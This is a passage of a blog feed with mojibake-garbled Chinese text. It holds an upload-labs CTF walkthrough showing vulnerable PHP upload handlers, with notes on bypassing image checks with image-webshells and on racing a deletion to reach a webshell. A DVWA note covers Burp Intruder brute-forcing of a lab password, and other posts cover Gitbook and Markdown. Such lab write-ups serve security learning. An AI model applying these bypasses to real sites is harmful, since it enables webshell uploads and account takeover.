class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><h2 id="ç¬¬16å…³-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#ç¬¬16å…³-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="ç¬¬16å…³ äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>ç¬¬16å…³ äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬å…³ç»¼åˆåˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“.</p><p><a href="https://yang1k.github.io/2018/08/30/upload-pass16/" target="_blank" rel="noopener">https://yang1k.github.io/2018/08/30/upload-pass16/</a></p><h2 id="ç¬¬17å…³-æ¡ä»¶ç«äº‰"><a href="#ç¬¬17å…³-æ¡ä»¶ç«äº‰" class="headerlink" title="ç¬¬17å…³ æ¡ä»¶ç«äº‰"></a>ç¬¬17å…³ æ¡ä»¶ç«äº‰</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ¡ä»¶ç«äº‰åˆ é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚è¿™é‡Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line">$img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">rename($upload_file, $img_path);</span><br></pre></td></tr></table></figure><p>å†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unlink</span>($upload_file);</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/05/02/JvJadS.png&quot; alt=&quot;JvJadS.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/05/02/JvJYsP.png&quot; alt=&quot;J
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://singlemindedt.github.io/tags/CTF/"/>
    
      <category term="Upload" scheme="https://singlemindedt.github.io/tags/Upload/"/>
    
  </entry>
  
  <entry>
    <title>DVWAç›¸å…³è®°å½•</title>
    <link href="https://singlemindedt.github.io/2020/08/02/DVWA%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>https://singlemindedt.github.io/2020/08/02/DVWAç›¸å…³è®°å½•/</id>
    <published>2020-08-02T06:09:37.000Z</published>
    <updated>2020-08-02T07:51:48.970Z</updated>
    
    <content type="html"><![CDATA[<p>æ ¹ç›®å½•ä¸‹å¯¹åº”ç›®å½•åè®¿é—®ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘çš„ï¼šhttp:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/DVWA-master/</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>admin</code>&amp;<code>password</code>ç™»å½•ï¼›</p><p>ä¾‹ï¼šå·²çŸ¥å¯†ç ä¸º4ä½æ•°å­—ï¼Œçˆ†ç ´å¯†ç </p><p>è¿æ¥ï¼š<a href="http://10.20.64.138/brute.php" target="_blank" rel="noopener">http://10.20.64.138/brute.php</a></p><p>getè¯·æ±‚ï¼Œ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pass</span> is <span class="literal">error</span></span><br><span class="line">hint: isset(<span class="variable">$_REQUEST</span>[<span class="string">'pass'</span>])</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><p><code>http://10.20.64.138/brute.php?pass=1234</code></p><ul><li><strong>BPæ‹¦æˆªï¼Œ</strong> </li></ul><ul><li><strong>Send to Intruder</strong></li></ul><p>Payload Positions ç¡®å®šæ”»å‡»ç›®æ ‡</p><ul><li><strong>Payloads</strong></li></ul><p>Payload Sets æ¨¡å—ï¼Œè®¾ç½®typeä¸ºNumberï¼›</p><p>éšæœº</p><p>æ•°å­—ç‰¹å¾</p><p>+++</p><p>è‡ªå®šä¹‰è¿­ä»£å™¨</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ ¹ç›®å½•ä¸‹å¯¹åº”ç›®å½•åè®¿é—®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;co
      
    
    </summary>
    
    
      <category term="DVWA" scheme="https://singlemindedt.github.io/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>Gitbookå®‰è£…ä¸ä½¿ç”¨</title>
    <link href="https://singlemindedt.github.io/2020/08/01/Gitbook%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://singlemindedt.github.io/2020/08/01/Gitbookå®‰è£…ä¸ä½¿ç”¨/</id>
    <published>2020-08-01T04:34:24.000Z</published>
    <updated>2020-08-01T05:59:29.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ol><li><p>æ¨èæ­é…ï¼šGit + Gitbook + Typora</p></li><li><p>ç¯å¢ƒï¼š</p><ul><li>GitBook æ˜¯åŸºäº Node.jsï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦å®‰è£… Node.jsï¼ˆå®‰è£… Node.js éƒ½ä¼šé»˜è®¤å®‰è£… npmï¼ˆnode åŒ…ç®¡ç†å·¥å…·ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨å•ç‹¬å®‰è£… npmï¼‰</li></ul></li><li><p>å®‰è£…Gitbook</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g gitbook-cli</span><br></pre></td></tr></table></figure><p>ç­‰å¾…å®‰è£…å®Œæ¯•ã€‚</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>æ–°å»ºæ–‡ä»¶å¤¹æ¯”å¦‚MyGitBook,å‘½ä»¤è¡Œæ‰§è¡Œ<code>gitbook init</code>;</p><p>+++</p><p><font color="#ff0000" size="5" face="é»‘ä½“">æ³¨æ„ï¼š</font></p><p>å¯èƒ½é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š</p><p><img src="https://s1.ax1x.com/2020/08/01/a370BD.png" alt="a370BD.png"></p><p>æˆ–</p><p><strong>installing gitbook xxx æ—¶é—´è¿‡é•¿</strong></p><p><font color="#ff0000" size="4" face="é»‘ä½“">è§£å†³æ–¹æ³•ï¼š</font></p><p>ç”±äºå®‰è£…è¿‡ç¨‹é»˜è®¤ä½¿ç”¨å›½å¤–é•œåƒï¼Œé€Ÿåº¦è¾ƒæ…¢æˆ–è¿æ¥è¶…æ—¶ï¼Œå¯ä»¥å°†å…¶åˆ‡æ¢ä¸ºå›½å†…é•œåƒï¼›</p><ul><li>å‘½ä»¤è¡Œä¸‹ï¼š<code>npm config set registry=http://registry.npm.taobao.org</code>ç›´æ¥è®¾ç½®é•œåƒ</li><li>æ‰“å¼€nodejså®‰è£…æ–‡ä»¶å¤¹ä¸‹é¢çš„å­ç›®å½•node_modules\npm\npmrcï¼Œæ·»åŠ é…ç½®<code>registry=http://registry.npm.taobao.org</code></li></ul><p>+++</p><p><code>Installing GitBook 3.2.3</code>æ‰§è¡Œå®Œæ¯•åï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://s1.ax1x.com/2020/08/01/a37wnO.png" alt="a37wnO.png"></p><p>ä¼šåœ¨MyGitBookä¸‹åˆ›å»ºï¼ŒREADME.mdå’ŒSUMMARY.mdæ–‡ä»¶ï¼›</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- GitBook</span><br><span class="line"> - README.md(ä»‹ç»æ–‡ä»¶)</span><br><span class="line"> - SUMMARY.md(ç›®å½•æ–‡ä»¶)</span><br></pre></td></tr></table></figure><p>+++</p><p>ç»ˆç«¯è¾“å…¥<code>girbook serve</code>å³å¯å¼€å¯ä¸€ä¸ª <code>localhost:4000</code> çš„æœåŠ¡ï¼Œè¯·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ <code>http://localhost:4000</code> å³å¯è®¿é—®æœåŠ¡ã€‚</p><p><img src="https://s1.ax1x.com/2020/08/01/a37rAH.png" alt="a37rAH.png"></p><p><img src="https://s1.ax1x.com/2020/08/01/a37BHe.png" alt="a37BHe.png"></p><p>+++</p><p>æ­¤æ—¶ä¼šåœ¨MyGitBookç›®å½•ä¸‹ç”Ÿæˆ<code>_book</code>ç›®å½•ï¼Œå…¶ä¸­æ˜¯index.htmlå’Œä¸€äº›é…ç½®æ–‡ä»¶ï¼›</p><p><code>gitbook serve</code>æœ¬èº«åŒ…æ‹¬äº†<code>gitbook build</code>å‘½ä»¤ï¼Œæ‰§è¡Œ <code>gitbook build</code> å‘½ä»¤æ„å»ºä¹¦ç±ï¼Œé»˜è®¤å°†ç”Ÿæˆçš„é™æ€ç½‘ç«™è¾“å‡ºåˆ° _book ç›®å½•ï¼›</p><p>+++</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_34293141/article/details/91413019" target="_blank" rel="noopener">1</a></p><p><a href="https://blog.csdn.net/lu_embedded/article/details/81100704?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.channel_param" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æ¨èæ­é…ï¼šGit + Gitbook + Typora&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¯å¢ƒï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Markdownè¯­æ³•è®°å½•</title>
    <link href="https://singlemindedt.github.io/2020/07/31/Markdown%E8%AF%AD%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://singlemindedt.github.io/2020/07/31/Markdownè¯­æ³•è®°å½•/</id>
    <published>2020-07-31T15:51:42.000Z</published>
    <updated>2020-08-02T05:54:55.084Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>é¢œè‰²ã€å­—ä½“ã€å¤§å°<br><font color="#ff000" face="é»‘ä½“" size="4">æµ‹è¯•0</font></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#ff000</span> <span class="attr">face</span>=<span class="string">"é»‘ä½“"</span> <span class="attr">size</span>=<span class="string">4</span>&gt;</span>æµ‹è¯•0<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>  <font color="#000000" face="åæ–‡å½©äº‘" size="4">æµ‹è¯•1</font></p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span> =<span class="string">#000000</span> <span class="attr">face</span> =<span class="string">"åæ–‡å½©äº‘"</span> <span class="attr">size</span>=<span class="string">4</span>&gt;</span>æµ‹è¯•1<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>æ³¨é‡Š</li></ol><ul><li><strong>ä»£ç æ³•</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display: none'</span>&gt;</span></span><br><span class="line">æ³¨é‡Š0</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>htmlæ³¨é‡Š</strong></li></ul><p>æ—¢ç„¶æ”¯æŒhtmlè¯­æ³•ï¼Œé‚£ä¹Ÿæ”¯æŒhtmlæ³¨é‡Šï¼Œå¿«æ·é”® comment + /ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--æ³¨é‡Š1--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">å¤šæ®µæ³¨é‡Šï¼Œ</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>hackæ–¹æ³•</strong></li></ul><p>hackæ–¹æ³•å°±æ˜¯åˆ©ç”¨markdownçš„è§£æåŸç†æ¥å®ç°æ³¨é‡Šçš„ã€‚<br> ä¸€èˆ¬æœ‰çš„markdownè§£æå™¨ä¸æ”¯æŒä¸Šé¢çš„æ³¨é‡Šæ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨hackæ–¹æ³•ã€‚<br> hackæ–¹æ³•æ¯”ä¸Šé¢2ç§æ–¹æ³•ç¨³å®šå¾—å¤šï¼Œä½†æ˜¯è¯­ä¹‰åŒ–å¤ªå·®ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">//</span>]: <span class="meta"># (å“ˆå“ˆæˆ‘æ˜¯æœ€å¼ºæ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)</span></span><br><span class="line">[<span class="meta">^_^</span>]: <span class="meta"># (å“ˆå“ˆæˆ‘æ˜¯æœ€èŒæ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)</span></span><br><span class="line">[<span class="meta">//</span>]: &lt;&gt; (å“ˆå“ˆæˆ‘æ˜¯æ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)</span><br><span class="line">[<span class="meta">comment</span>]: &lt;&gt; (å“ˆå“ˆæˆ‘æ˜¯æ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/ebe52d2d468f" target="_blank" rel="noopener">æ­¤å¤„å‚è€ƒï¼šæ‹©åŠ¿å‹¤</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;é¢œè‰²ã€å­—ä½“ã€å¤§å°&lt;br&gt;&lt;font color=&quot;#ff000&quot; face=&quot;é»‘ä½“&quot; size=&quot;4&quot;&gt;æµ‹è¯•0&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Docker-notes1</title>
    <link href="https://singlemindedt.github.io/2020/07/31/Docker-notes1/"/>
